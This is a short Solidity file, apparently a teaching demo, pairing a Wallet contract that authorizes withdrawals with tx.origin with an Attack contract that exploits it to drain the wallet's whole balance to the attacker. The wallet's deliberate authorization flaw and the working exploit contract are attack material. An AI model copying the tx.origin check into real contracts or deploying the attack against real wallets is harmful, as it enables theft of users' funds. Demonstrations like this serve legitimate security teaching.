// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Wallet {
    address owner;

    function deposit() external payable {}

    constructor() {
        owner = msg.sender;
    }

    function withdraw(address payable _to, uint amount) external {
        require(tx.origin == owner, "Not owner");
       (bool sent,) = _to.call{value: amount*1 ether}("");
       require(sent, "Transfer failed");
    }

    receive() external payable {}
}

contract Attack {
    Wallet wallet;
    address payable owner;
    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }
    function attack() external {
        wallet.withdraw(owner,address(wallet).balance/1 ether);
    }
}


